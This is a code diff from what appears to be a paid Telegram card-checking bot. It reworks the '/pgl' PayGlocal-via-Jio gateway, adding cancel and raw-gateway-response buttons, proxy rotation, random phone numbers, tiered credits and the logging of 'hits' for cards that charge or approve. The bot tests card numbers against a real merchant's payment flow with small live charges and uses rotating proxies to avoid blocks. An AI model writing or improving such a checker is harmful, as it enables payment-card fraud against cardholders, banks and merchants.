@@ -228,6 +228,60 @@ class _DebouncedJSONWriter:
 _json_writer = _DebouncedJSONWriter()
 
 
+# ═══════════════════════════════════════════════════════════════════════════
+#  SAFE HTML SEND/EDIT — survives an invalid custom-emoji id
+#  Telegram rejects the whole message with "Bad Request: DOCUMENT_INVALID"
+#  when ONE <tg-emoji emoji-id="…"> is not available to the bot. These
+#  helpers retry with the plain fallback emoji instead of losing the reply.
+# ═══════════════════════════════════════════════════════════════════════════
+
+_TG_EMOJI_TAG_RE = re.compile(
+    r'<tg-emoji\s+emoji-id="\d+">(.*?)</tg-emoji>', re.S)
+
+
+def strip_premium_emoji_tags(text: str) -> str:
+    """'<tg-emoji …>📱</tg-emoji>' -> '📱' (keeps the visible fallback)."""
+    try:
+        return _TG_EMOJI_TAG_RE.sub(r"\1", text or "")
+    except Exception:
+        return text or ""
+
+
+def _is_emoji_related_error(err: Exception) -> bool:
+    msg = str(err).lower()
+    return ("document_invalid" in msg
+            or "document invalid" in msg
+            or "can't parse entities" in msg
+            or "unsupported start tag" in msg
+            or "entity" in msg and "invalid" in msg)
+
+
+async def safe_edit_html(message, text: str, **kwargs):
+    """edit_text(HTML); on an emoji/parse error retry with plain emoji."""
+    try:
+        return await message.edit_text(text, parse_mode=ParseMode.HTML, **kwargs)
+    except BadRequest as e:
+        if not _is_emoji_related_error(e):
+            raise
+        print(f"⚠️ [SAFE EDIT] retrying without premium emojis: {e}")
+        return await message.edit_text(
+            strip_premium_emoji_tags(text), parse_mode=ParseMode.HTML, **kwargs)
+
+
+async def safe_reply_html(message, text: str, **kwargs):
+    """reply_text(HTML); on an emoji/parse error retry with plain emoji."""
+    try:
+        return await message.reply_text(text, parse_mode=ParseMode.HTML, **kwargs)
+    except BadRequest as e:
+        if not _is_emoji_related_error(e):
+            raise
+        print(f"⚠️ [SAFE REPLY] retrying without premium emojis: {e}")
+        return await message.reply_text(
+            strip_premium_emoji_tags(text), parse_mode=ParseMode.HTML, **kwargs)
+
+
+
+
 async def download_document_bytes(document, attempts: int = 5, base_delay: float = 2.0):
     """Download a Telegram document's raw bytes as reliably as possible.
 
@@ -5857,7 +5911,7 @@ async def single_check_auto_stripe(update: Update, context: ContextTypes.DEFAULT
         
         # Send the result to user
         try:
-            await status_msg.edit_text(ui, parse_mode=ParseMode.HTML)
+            await safe_edit_html(status_msg, ui)
         except Exception:
             await message.reply_text(ui, parse_mode=ParseMode.HTML)
         print(f"✅ [AUTO STRIPE DEBUG] Result sent to user {user_id}")
@@ -16343,6 +16397,390 @@ PAYGLOCAL_CURRENCY = "USD"
 # Active tasks for PayGlocal
 payglocal_active_tasks = {}
 
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  SINGLE-CHECK CONTROLS  —  Cancel + Real Response   (/pgl and /jhit)
+#
+#  Cancel        → a button under the "Checking…" card. Tapping it raises a
+#                  per-user flag that the check loop polls between number /
+#                  proxy attempts, so the run aborts on its own instead of
+#                  running the whole flow to the end.
+#  Real Response → the RAW gateway reply (iPay errors / ccdc body / full JSON)
+#                  is kept for every card of the run and handed back on demand,
+#                  instead of the normalised "3D REQUIRED" / "DECLINED" label.
+# ═══════════════════════════════════════════════════════════════════════════
+
+# uid -> {gateway_key, ...} the user asked to stop.
+# Popped by _stop_everything_for_user(), so the global Stop buttons work too.
+user_stop_flags: Dict[int, set] = {}
+
+# uid -> {"gateway": str, "started": ts, "ts": ts,
+#          "cards": [{"card", "status", "status_text", "real", "raw"}]}
+single_check_real_responses: Dict[int, dict] = {}
+
+REAL_RESPONSE_MAX_CHARS = 6000
+SC_REALRESP_IDLE_RESET = 1800   # 30 min: a new run starts a fresh bucket
+
+# Raw step payloads that are INTERNAL (3DS/ACS handshake, encrypted payload)
+# and must never be shown to the bot's users.
+_SC_INTERNAL_RAW_KEYS = ("3ds_raw", "easebuzz_raw", "ccdc_raw", "payglocal_raw")
+
+_SC_CANCEL_ICON   = "5206121558164573238"   # ❌
+_SC_REALRESP_ICON = "5042306247047513767"   # 🧾
+
+
+def sc_clear_stop(uid: int, gateway: str) -> None:
+    """Forget any previous cancel request for this user/gateway."""
+    flags = user_stop_flags.get(uid)
+    if not flags:
+        return
+    flags.discard(gateway)
+    if not flags:
+        user_stop_flags.pop(uid, None)
+
+
+def sc_request_stop(uid: int, gateway: str) -> None:
+    """Raise the cancel flag for this user/gateway."""
+    user_stop_flags.setdefault(uid, set()).add(gateway)
+
+
+def sc_is_stopped(uid: int, gateway: str) -> bool:
+    """True once the user pressed Cancel for this run."""
+    return gateway in (user_stop_flags.get(uid) or set())
+
+
+def sc_cancel_keyboard(uid, gateway: str) -> InlineKeyboardMarkup:
+    """Cancel button shown on the "Checking…" message."""
+    return InlineKeyboardMarkup([[
+        InlineKeyboardButton("Cancel", callback_data=f"sccancel_{gateway}_{uid}",
+                             style='danger', icon_custom_emoji_id=_SC_CANCEL_ICON),
+    ]])
+
+
+def sc_real_response_keyboard(uid, gateway: str) -> InlineKeyboardMarkup:
+    """"Real Response" button shown once a card has a result."""
+    return InlineKeyboardMarkup([[
+        InlineKeyboardButton("Real Response",
+                             callback_data=f"scrreal_{gateway}_{uid}",
+                             style='primary', icon_custom_emoji_id=_SC_REALRESP_ICON),
+    ]])   
+
+
+def sc_cancelled_text(gateway: str, card: str = "", refunded: bool = False) -> str:
+    """Card shown when the user cancels a single check."""
+    parts = [
+        f"🛑 <b>{html.escape(gateway)}</b> — <b>CANCELLED</b>",
+        "",
+    ]
+    if card:
+        parts.append(f"💳 <b>Card</b> ➛ <code>{html.escape(str(card))}</code>")
+    parts.append("👤 Cancelled by you — the check was stopped.")
+    if refunded:
+        parts.append("🪙 <b>1 credit refunded</b>")
+    return "\n".join(parts)
+
+
+def _sc_pick(*values, limit: int = 200) -> str:
+    """First non-empty, non-boilerplate string out of *values*."""
+    junk = ("", "none", "null", "unknown", "n/a", "false", "true")
+    for v in values:
+        if v is None:
+            continue
+        t = str(v).strip()
+        if not t or t.lower() in junk:
+            continue
+        return t[:limit]
+    return ""
+
+
+def _sc_body_snippet(payload, limit: int = 160) -> str:
+    """Turn a RAW gateway body (HTML / JSON / text) into one readable line."""
+    if payload is None:
+        return ""
+    if isinstance(payload, (dict, list)):
+        text = json.dumps(payload, ensure_ascii=False)
+    else:
+        text = str(payload)
+    text = text.strip()
+    if not text:
+        return ""
+
+    # JSON body → prefer the human-readable fields
+    if text[:1] in "{[":
+        try:
+            data = json.loads(text)
+        except Exception:
+            data = None
+        if isinstance(data, dict):
+            for key in ("error_description", "errorMessage", "error_message",
+                        "error", "message", "msg", "detail", "description",
+                        "statusMessage", "title"):
+                val = data.get(key)
+                if isinstance(val, str) and val.strip():
+                    return re.sub(r"\s+", " ", val).strip()[:limit]
+
+    # HTML body → title + visible text (tags, CSS and JS stripped).
+    # BeautifulSoup copes with the truncated pages the flow stores, which
+    # plain regexes cannot (an unclosed <style> used to leak CSS into the
+    # "Real Response" line).
+    title_txt = ""
+    m = re.search(r"(?is)<title[^>]*>(.*?)</title>", text)
+    if m:
+        title_txt = html.unescape(re.sub(r"\s+", " ", m.group(1))).strip()
+
+    body = ""
+    try:
+        soup = BeautifulSoup(text, "html.parser")
+        for tag in soup(["script", "style", "noscript", "template"]):
+            tag.decompose()
+        body = soup.get_text(" ", strip=True)
+    except Exception:
+        body = ""
+    if not body:
+        body = re.sub(r"(?is)<(script|style|noscript)[^>]*>.*?</\1>", " ", text)
+        body = re.sub(r"(?s)<!--.*?-->", " ", body)
+        body = re.sub(r"(?s)<[^>]+>", " ", body)
+    body = re.sub(r"[^{}]{0,160}\{[^{}]{0,600}\}", " ", body)  # leftover CSS
+    body = re.sub(r"\s+", " ", html.unescape(body)).strip()
+
+    if title_txt and title_txt.lower() not in body.lower():
+        body = f"{title_txt} — {body}" if body else title_txt
+    elif not body:
+        body = title_txt
+    return body[:limit]
+
+
+def extract_real_response(result: dict, limit: int = 400) -> str:
+    """The RAW gateway reply for one card — no normalisation.
+
+    Priority: iPay (bank) error fields → ccdc body → the flow's own message.
+    """
+    if not isinstance(result, dict):
+        return "" if result is None else str(result)[:limit]
+
+    steps = result.get("steps") or {}
+    ipay = steps.get("ipay") or {}
+    errors = ipay.get("errors") if isinstance(ipay, dict) else None
+    if not isinstance(errors, dict):
+        errors = {}
+    ccdc = steps.get("ccdc") or {}
+    if not isinstance(ccdc, dict):
+        ccdc = {}
+
+    bits = []
+    code = _sc_pick(errors.get("errorCode"), errors.get("code"),
+                    ipay.get("errorCode"), ipay.get("code"), limit=40)
+    bank = _sc_pick(errors.get("detailedMessage"), errors.get("displayMessage"),
+                    errors.get("message"), limit=200)
+    bank_status = _sc_pick(ipay.get("status"), limit=40)
+    body = _sc_pick(ccdc.get("message"), ccdc.get("error"),
+                    ccdc.get("respMessage"), limit=160)
+    own = _sc_pick(result.get("error"), limit=160)
+
+    # RAW bodies captured by the flow (easebuzz page, payglocal reply, …).
+    # These are what the gateway ACTUALLY answered, so they are shown even
+    # when the flow ends on its own internal error (e.g. x-gl-token missing).
+    # 3DS internals (ACS url, provider, encrypted payload) are INTERNAL and
+    # must never be surfaced to users.
+    raws = []
+    for key, val in steps.items():
+        if not isinstance(key, str) or not key.endswith("_raw") or not val:
+            continue
+        if key in _SC_INTERNAL_RAW_KEYS:
+            continue
+        snip = _sc_body_snippet(val, limit=150)
+        if snip:
+            raws.append(f"{key[:-4]}: {snip}")
+
+    if bank_status:
+        bits.append(f"bank={bank_status}")
+    if code:
+        bits.append(f"code={code}")
+    if bank:
+        bits.append(bank)
+    if body:
+        bits.append(f"ccdc: {body}")
+    bits.extend(raws)
+    if own:
+        bits.append(f"flow: {own}")
+
+    text = " • ".join(dict.fromkeys(bits)) if bits else ""
+    if not text:
+        text = _sc_pick(result.get("message"), result.get("status"), limit=200)
+    if len(text) > limit:
+        text = text[: limit - 3] + "..."
+    return text
+
+
+def sc_real_response_line(result: dict, limit: int = 120) -> str:
+    """Short single-line real response, safe to drop under a result card."""
+    return extract_real_response(result, limit=limit)
+
+
+def _sc_sanitize_result(result):
+    """Strip INTERNAL-only payloads (3DS handshake, htmlForm/encdata) before
+    a result is stored or shown to a user."""
+    try:
+        safe = json.loads(json.dumps(result, default=str))
+    except Exception:
+        return result
+    if not isinstance(safe, dict):
+        return safe
+    steps = safe.get("steps")
+    if isinstance(steps, dict):
+        for key in list(steps):
+            if isinstance(key, str) and (key in _SC_INTERNAL_RAW_KEYS or key == "3ds"):
+                steps.pop(key, None)
+        ccdc = steps.get("ccdc")
+        if isinstance(ccdc, dict):
+            ccdc.pop("htmlForm", None)
+    return safe
+
+
+def sc_remember_real_response(uid: int, gateway: str, card: str, result: dict,
+                              status_text: str = "") -> None:
+    """Store the raw reply of one checked card (bucketed per run)."""
+    try:
+        now = time.time()
+        bucket = single_check_real_responses.get(uid)
+        if (bucket is None
+                or bucket.get("gateway") != gateway
+                or (now - bucket.get("ts", 0)) > SC_REALRESP_IDLE_RESET):
+            bucket = {"gateway": gateway, "started": now, "ts": now, "cards": []}
+            single_check_real_responses[uid] = bucket
+
+        raw = json.dumps(_sc_sanitize_result(result), indent=2,
+                         ensure_ascii=False, default=str)
+        if len(raw) > REAL_RESPONSE_MAX_CHARS:
+            raw = raw[:REAL_RESPONSE_MAX_CHARS] + "\n… (truncated)"
+
+        bucket["ts"] = now
+        bucket["cards"].append({
+            "card": str(card),
+            "status": str((result or {}).get("status") or "UNKNOWN"),
+            "status_text": str(status_text or (result or {}).get("status") or ""),
+            "real": extract_real_response(result) or "(empty)",
+            "raw": raw,
+        })
+        # keep memory bounded on long runs
+        if len(bucket["cards"]) > 60:
+            bucket["cards"] = bucket["cards"][-60:]
+    except Exception as e:
+        print(f"⚠️ [REALRESP] store failed: {e}")
+
+
+def sc_build_real_response_text(uid: int, max_cards: int = 5) -> str:
+    """Formatted message listing the REAL gateway replies of a run."""
+    bucket = single_check_real_responses.get(uid)
+    if not bucket or not bucket.get("cards"):
+        return ""
+
+    cards = bucket["cards"]
+    out = [
+        f"🧾 <b>Real Response</b> ➛ {html.escape(str(bucket.get('gateway', '?'))).upper()}",
+        f"📊 <b>Cards checked</b> ➛ {len(cards)}",
+    ]
+    for entry in cards[-max_cards:]:
+        out.append("")
+        out.append(f"💳 <code>{html.escape(entry.get('card', ''))}</code>")
+        out.append(
+            f"   └ <b>{html.escape(entry.get('status', '') or 'UNKNOWN')}</b>"
+            f" — {html.escape(entry.get('status_text', ''))}"
+        )
+        out.append(f"   🧾 <code>{html.escape(entry.get('real', ''))}</code>")
+
+    text = "\n".join(out)
+    if len(text) > 3900:
+        text = text[-3900:]
+    return text
+
+
+async def sc_cancel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Cancel button for /pgl and /jhit single checks (sccancel_<gw>_<uid>)."""
+    query = update.callback_query
+    data = query.data or ""
+    try:
+        _p, gateway, uid_s = data.split("_", 2)
+        target_uid = int(uid_s)
+    except Exception:
+        await query.answer("⚠️ Invalid cancel request.", show_alert=True)
+        return
+
+    if update.effective_user.id != target_uid:
+        await query.answer("⚠️ Only the person who started this check can cancel it.",
+                           show_alert=True)
+        return
+
+    sc_request_stop(target_uid, gateway)
+    await query.answer("🛑 Cancelling — the check stops after this attempt.")
+
+    # drop the keyboard so it cannot be pressed twice (buttons are retired)
+    try:
+        await query.edit_message_reply_markup(reply_markup=None)
+    except Exception:
+        pass
+
+
+async def sc_real_response_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Real Response button for /pgl and /jhit (scrreal_<gw>_<uid>)."""
+    query = update.callback_query
+    data = query.data or ""
+    try:
+        _p, gateway, uid_s = data.split("_", 2)
+        target_uid = int(uid_s)
+    except Exception:
+        await query.answer("⚠️ Invalid request.", show_alert=True)
+        return
+
+    if update.effective_user.id != target_uid:
+        await query.answer("⚠️ These aren't your results.", show_alert=True)
+        return
+
+    bucket = single_check_real_responses.get(target_uid)
+    if not bucket or not bucket.get("cards"):
+        await query.answer("⚠️ No response stored yet — run a check first.",
+                           show_alert=True)
+        return
+
+    await query.answer("🧾 Pulling real response…")
+    chat_id = update.effective_chat.id
+
+    # 1) short summary in chat
+    summary = sc_build_real_response_text(target_uid)
+    if summary:
+        try:
+            await context.bot.send_message(chat_id=chat_id, text=summary,
+                                           parse_mode=ParseMode.HTML)
+        except BadRequest:
+            await context.bot.send_message(
+                chat_id=chat_id,
+                text=strip_premium_emoji_tags(summary),
+                parse_mode=ParseMode.HTML)
+
+    # 2) full raw payload as a .txt so nothing is truncated
+    lines = []
+    for entry in bucket.get("cards", []):
+        lines.append("=" * 60)
+        lines.append(f"CARD      : {entry.get('card', '')}")
+        lines.append(f"STATUS    : {entry.get('status', '')}")
+        lines.append(f"VERDICT   : {entry.get('status_text', '')}")
+        lines.append(f"REAL      : {entry.get('real', '')}")
+        lines.append("RAW JSON  :")
+        lines.append(entry.get("raw", ""))
+    payload = "\n".join(lines) or "(empty)"
+
+    try:
+        buf = io.BytesIO(payload.encode("utf-8"))
+        buf.name = f"real_response_{gateway}.txt"
+        await context.bot.send_document(
+            chat_id=chat_id, document=buf, filename=buf.name,
+            caption=(f"🧾 <b>Raw gateway response</b>\n"
+                     f"🌐 {html.escape(str(bucket.get('gateway', '')).upper())}"
+                     f" • {len(bucket.get('cards', []))} card(s)"),
+            parse_mode=ParseMode.HTML)
+    except Exception as e:
+        print(f"⚠️ [REALRESP] document send failed: {e}")
+
 # ============ HELPER FUNCTIONS ============
 
 def _decode_jwt_payload_pl(token: str) -> dict:
@@ -16870,6 +17308,93 @@ def format_payglocal_response(result: Dict, card: str, bin_info: tuple) -> Tuple
 
 # ============ PAYGLOCAL SINGLE CHECK COMMAND ============
 
+# ═══════════════════════════════════════════════════════════════════════════
+#  PayGlocal single-check CARD  (same layout as the other gateways)
+# ═══════════════════════════════════════════════════════════════════════════
+
+PG_PRICE_LABEL = "0.30$"
+
+
+def _pgl_status_text(result: dict, card: str):
+    """(status_text, category) using the shared Jio verdict logic."""
+    try:
+        line, category = format_jio_response(result, card, compact=True)
+    except Exception:
+        line, category = "", (result.get("status") or "ERROR").lower()
+
+    text = ""
+    if "⤷" in line:
+        text = line.split("⤷", 1)[1]
+    else:
+        text = str(result.get("message") or result.get("error") or "Unknown")
+
+    # drop premium-emoji tags + any leading emoji/symbols
+    text = re.sub(r'<tg-emoji[^>]*>.*?</tg-emoji>', '', text, flags=re.S)
+    text = re.sub(r'^[\s\W_]+', '', text).strip()
+    if len(text) > 90:
+        text = text[:87] + "..."
+
+    cat = (category or "error").lower()
+    if not text:
+        text = "Unknown"
+    return text, cat
+
+
+def format_payglocal_single(card: str, status_category: str,
+                            response_text: str, bin_info: tuple) -> str:
+    """PayGlocal 💫 card: CARD / RESPONSE / PRICE / BIN / BANK / COUNTRY."""
+    try:
+        bin_info_text, bank, country, _, _ = bin_info
+    except Exception:
+        bin_info_text, bank, country = "Unknown", "Unknown", "🌍 Unknown"
+
+    cat = (status_category or "error").lower()
+
+    if cat == "charged":
+        emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("charged", "5039670412733055750"), "🔥")
+    elif cat in ("pending", "processing", "inprogress", "authorized"):
+        # Authorized / captured-but-unconfirmed: not a hit yet, but not dead
+        # either — show it as pending instead of the old warning icon.
+        emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("pending", "5206351870765300656"), "⏳")
+    elif cat in ("approved", "live"):
+        emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("approved", "6266787022111773140"), "✅")
+    elif cat == "declined":
+        emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("declined", "6267039884016358504"), "❌")
+    else:
+        emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("error", "6282641460093260838"), "⚠️")
+
+    bank_display = str(bank or "Unknown").replace("🌐", "").strip() or "Unknown"
+    if bank_display.endswith(" - DEBIT"):
+        pass
+    if len(bank_display) > 30:
+        bank_display = bank_display[:27] + "..."
+
+    country_name = str(country or "Unknown").replace("🌐", "").strip() or "Unknown"
+    _flag_re = "🇦🇧🇨🇩🇪🇫🇬🇭🇮🇯🇰🇱🇲🇳🇴🇵🇶🇷🇸🇹🇺🇻🇼🇽🇾🇿"
+    if any(ch in country_name for ch in _flag_re):
+        country_display = country_name
+    else:
+        flag = "🌍"
+        upper = country_name.upper()
+        for key, val in _CC_FLAG_MAP.items():
+            if key in upper:
+                flag = val
+                break
+        country_display = f"{flag}  {country_name}"
+
+    clean_resp = str(response_text or "Unknown").strip()[:80]
+
+    return (
+        f"<b>PayGlocal</b> {_UI_SPARKLE}\n\n"
+        f"{_UI_STAR} 𝗖𝗔𝗥𝗗 ↣ <code>{card}</code>\n\n"
+        f"{emoji} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ↣ <code>{clean_resp}</code>\n"
+        f"{_UI_COIN} 𝗣𝗿𝗶𝗰𝗲 ↣ <b>{PG_PRICE_LABEL}</b>\n\n"
+        f"{_UI_GLOBE} 𝗕𝗜𝗡 ↣ <b>{bin_info_text}</b>\n"
+        f"{_UI_ROCKET} 𝗕𝗮𝗻𝗸 ↣ <b>{bank_display}</b>\n"
+        f"{_UI_BIN} 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↣ <b>{country_display}</b>"
+    )
+
+
 @check_gateway("payglocal")
 # ============ PAYGLOCAL-LITE GATEWAY (via Jio) ============
 # Reuses your existing jio_hit() with low amount
@@ -16885,9 +17410,9 @@ async def single_check_payglocal_lite(update: Update, context: ContextTypes.DEFA
             "💳 <b>PayGlocal Gateway (via Jio)</b>\n\n"
             "Usage: <code>/pgl &lt;card&gt;</code>\n"
             "Example: <code>/pgl 4890161234567890|12|2028|123</code>\n\n"
-            "💰 Amount: ₹10\n"
+            "💰 Amount: <b>smallest Jio pack</b> (auto)\n"
             "📍 Gateway: PayGlocal (via Jio)\n"
-            "📱 Need a test phone number? Use any 10-digit Jio number.",
+            "📱 Phone: <b>rotating Jio numbers</b> (auto-retry if unused)",
             parse_mode=ParseMode.HTML
         )
         return
@@ -16902,37 +17427,34 @@ async def single_check_payglocal_lite(update: Update, context: ContextTypes.DEFA
         await message.reply_text("❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV")
         return
     
+    # Check gateway access FIRST (PayGlocal = ULTIMATE / ADMIN only), so a
+    # lower tier never gets charged and refunded for a check it cannot run.
+    if not user_manager.can_access_gateway(user_id, 'payglocal'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ <b>PayGlocal not available for {tier.upper()} tier</b>\n\n"
+            f"PayGlocal is available on <b>ULTIMATE</b> and <b>ADMIN</b> only.\n\n"
+            f"USE /buy TO UPGRADE YOUR TIER 💎",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
     # Check credits
     can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
     if not can_proceed:
         await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
         return
     
-    # Check gateway access
-    if not user_manager.can_access_gateway(user_id, 'payglocal'):
-        tier = user_manager.get_tier(user_id)
-        await message.reply_text(
-            f"❌ <b>PayGlocal not available for {tier.upper()} tier</b>\n\n"
-            f"USE /buy TO UPGRADE YOUR TIER 💎",
-            parse_mode=ParseMode.HTML
-        )
-        add_user_credits(user_id, 1)
-        return
-    
     # Parse card
     parts = card.split('|')
     cc, mm, yy, cvv = parts
     
-    # ============ USE EXISTING JIO FLOW ============
-    # Use a default Jio test number (you can rotate these)
-    TEST_JIO_NUMBERS = [
-        "6398093450",
-    ]
-    test_phone = random.choice(TEST_JIO_NUMBERS)
-    test_amount = "11"  # ₹10 minimum for Jio plans
+    # ============ USE JIO FLOW (random number, smallest pack) ============
     
     payglocal_active_tasks[user_id] = True
-    
+    sc_clear_stop(user_id, "pgl")
+
+    status_msg = None
     try:
         tier = user_manager.get_tier(user_id)
         
@@ -16943,55 +17465,84 @@ async def single_check_payglocal_lite(update: Update, context: ContextTypes.DEFA
         
         start = time.time()
         
-        # Get proxy
-        proxy_str = None
+        # ============ GLOBAL PROXY POOL (rotated + dead-proxy cleanup) ====
+        proxy_list = []
         if user_manager.can_use_proxy(user_id):
-            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
-                proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
-                if proxy_list:
-                    proxy_str = proxy_list[0]
-        
-        # ============ CALL EXISTING jio_hit() ============
-        loop = asyncio.get_event_loop()
-        result = await loop.run_in_executor(
-            thread_pool,
-            jio_hit,
-            test_phone, test_amount, cc, mm, yy, cvv, proxy_str
-        )
+            try:
+                proxy_list = _ext_proxy_list(user_id, 3)
+            except Exception as _pe:
+                print(f"⚠️ [PGL] proxy list failed: {_pe}")
+                proxy_list = []
+
+        if proxy_list:
+            print(f"🔌 [PGL] Global pool: {len(proxy_list)} proxy(ies) → "
+                  + ", ".join(mask_proxy(_p) for _p in proxy_list))
+        else:
+            print("🔌 [PGL] no proxy available — direct connection")
+
+        # ============ RANDOM JIO NUMBER + SMALLEST PACK ============
+        result = await _pgl_run_with_proxies(
+            card, proxy_list,
+            stop_check=lambda: sc_is_stopped(user_id, "pgl"))
         
         elapsed = time.time() - start
+
+        # ============ USER PRESSED CANCEL ============
+        # Only abort when no verdict came back. If the attempt already
+        # finished, show what the bank said and just note the cancel.
+        _cancel_note = ""
+        if (result or {}).get("status") == "CANCELLED":
+            print(f"\U0001f6d1 [PGL] cancelled by user {user_id}")
+            add_user_credits(user_id, 1)
+            await safe_edit_html(
+                status_msg,
+                sc_cancelled_text("PayGlocal", card, refunded=True))
+            return
+        if sc_is_stopped(user_id, "pgl"):
+            _cancel_note = "\n\n🛑 <b>Cancelled</b> — this attempt had already finished."
         
         # Get BIN info
         bin_info = await get_bin_info(card)
         
-        # Format response
-        ui, status_category = format_jio_response(result, card)
+        # Format response — same card layout as the other gateways
+        response_text, status_category = _pgl_status_text(result, card)
+
+        ui = format_payglocal_single(card, status_category,
+                                     response_text, bin_info)
+
+        # NOTE: the raw gateway/3DS payload is NOT printed on the card and no
+        # action buttons are attached — PayGlocal shows a clean verdict only.
+        ui += _cancel_note
         
-        # Rename gateway in the output
-        ui = ui.replace("Site - Jio", "Site - PayGlocal")
-        ui = ui.replace("Jio Recharge Result", "PayGlocal Result")
-        
-        await status_msg.edit_text(ui, parse_mode=ParseMode.HTML)
+        await safe_edit_html(status_msg, ui)
         
         # Save hit
         if status_category in ["charged", "approved"]:
             await save_hit_to_file(
                 card=card, gateway="PayGlocal",
-                response=result.get("message") or "Approved",
-                price="₹10",
+                response=response_text or "Approved",
+                price=PG_PRICE_LABEL,
                 bin_info=bin_info, user_id=user_id, user_tier=tier
             )
             
             user_data = user_manager.get_user(user_id)
             await send_hit_notification(
                 context=context, gateway="PayGlocal", card=card,
-                response=result.get("message") or "Approved",
-                price="₹10",
+                response=response_text or "Approved",
+                price=PG_PRICE_LABEL,
                 user=user_data, bin_info=bin_info, status_category=status_category
             )
             
             if status_category == "charged":
                 user_manager.increment_hits(user_id)
+        elif status_category == "pending":
+            # AUTHORIZED / captured-but-unconfirmed: the card is not dead, but
+            # it is not a hit either. Surface it in the user's Live results
+            # (never as Charged) and keep it out of hits.txt.
+            _reason_low = str(response_text or "").lower()
+            if any(k in _reason_low for k in ("authoriz", "authoris", "captur")):
+                mc_record_hit(user_id, card, "PayGlocal", response_text, "0")
+            print(f"⏳ [PGL] PENDING: {response_text}")
         
         user_manager.increment_checks(user_id)
         
@@ -16999,17 +17550,31 @@ async def single_check_payglocal_lite(update: Update, context: ContextTypes.DEFA
         print(f"❌ PayGlocal error: {e}")
         traceback.print_exc()
         try:
-            await status_msg.edit_text(f"❌ Error: {str(e)[:100]}")
-        except:
-            await message.reply_text(f"❌ Error: {str(e)[:100]}")
+            await safe_edit_html(status_msg, f"❌ Error: {str(e)[:100]}")
+        except Exception:
+            await safe_reply_html(message, f"❌ Error: {str(e)[:100]}")
         add_user_credits(user_id, 1)
     finally:
         payglocal_active_tasks.pop(user_id, None)
+        sc_clear_stop(user_id, "pgl")
 
 
+@check_gateway("payglocal")
 async def mass_check_payglocal_lite(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Mass check via PayGlocal (uses existing Jio flow) - /mpgl <cards>"""
-    
+    """REMOVED. PayGlocal is a SINGLE-check gateway now — only /pgl exists.
+
+    The command handler is no longer registered; this guard keeps the old
+    entry point harmless if it is ever wired up again by mistake.
+    """
+    await update.effective_message.reply_text(
+        "❌ <b>/mpgl has been removed</b>\n\n"
+        "PayGlocal is a single-check gateway now.\n"
+        "Use <code>/pgl &lt;card&gt;</code> instead.",
+        parse_mode=ParseMode.HTML,
+    )
+    return
+
+    # ───────────────────────── legacy code (unreachable) ─────────────────
     if not await verify_group_access(update, context):
         return
     
@@ -17060,8 +17625,9 @@ async def mass_check_payglocal_lite(update: Update, context: ContextTypes.DEFAUL
             "📦 <b>PayGlocal Mass Check</b>\n\n"
             "Usage: <code>/mpgl &lt;card1&gt; &lt;card2&gt; ...</code>\n"
             "Or reply to a .txt file\n\n"
-            "💰 Amount: ₹10\n"
-            "📍 Gateway: PayGlocal (via Jio)",
+            "💰 Amount: <b>smallest Jio pack</b> (auto)\n"
+            "📍 Gateway: PayGlocal (via Jio)\n"
+            "📱 Phone: <b>random Jio number</b> per card",
             parse_mode=ParseMode.HTML
         )
         return
@@ -17100,11 +17666,19 @@ async def _mass_check_payglocal_logic(update, context, cards, progress_msg):
     message = update.effective_message
     total = len(cards)
     
-    stats = {"charged": 0, "approved": 0, "declined": 0, "errors": 0, "total": total, "processed": 0}
+    stats = {"charged": 0, "approved": 0, "pending": 0, "declined": 0, "errors": 0, "total": total, "processed": 0}
     start_time = time.time()
     
-    # Test Jio numbers
-    TEST_NUMBERS = ["9999999999", "8888888888", "7777777777", "9876543210", "9123456789"]
+    # Global proxy pool (shared) — rotated per card, dead ones are dropped
+    _pgl_proxies = []
+    if user_manager.can_use_proxy(u_id):
+        try:
+            _pgl_proxies = _ext_proxy_list(u_id, 3)
+        except Exception as _pe:
+            print(f"⚠️ [PGL mass] proxy list failed: {_pe}")
+            _pgl_proxies = []
+    print(f"🔌 [PGL mass] {len(_pgl_proxies)} global proxy(ies) for rotation"
+          if _pgl_proxies else "🔌 [PGL mass] no proxy — direct")
     
     try:
         payglocal_active_tasks[u_id] = True
@@ -17112,11 +17686,12 @@ async def _mass_check_payglocal_logic(update, context, cards, progress_msg):
         
         if progress_msg is None:
             progress_msg = await message.reply_text(
-                f"<b>Gateway</b> ➛ PayGlocal (₹10)\n"
+                f"<b>Gateway</b> ➛ PayGlocal (smallest pack)\n"
                 f"<b>Status</b> ➛ STARTING...\n"
                 f"<b>Checked</b> ➛ 0/{total}\n"
                 f"<b>Charged</b> ➛ 0\n"
                 f"<b>Approved</b> ➛ 0\n"
+                f"<b>Pending</b> ➛ 0\n"
                 f"<b>Declined</b> ➛ 0\n"
                 f"<b>Time</b> ➛ 0s",
                 parse_mode=ParseMode.HTML
@@ -17131,26 +17706,14 @@ async def _mass_check_payglocal_logic(update, context, cards, progress_msg):
             nonlocal processed
             
             async with semaphore:
-                # Get proxy
-                proxy_str = None
-                if user_manager.can_use_proxy(u_id):
-                    if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
-                        plist = autosopi_proxy_tracker.working_proxies[u_id]
-                        if plist:
-                            proxy_str = plist[idx % len(plist)]
-                
                 parts = card.split('|')
                 if len(parts) != 4:
                     return
                 
                 cc, mm, yy, cvv = parts
-                phone = random.choice(TEST_NUMBERS)
-                
-                loop = asyncio.get_event_loop()
-                result = await loop.run_in_executor(
-                    thread_pool, jio_hit,
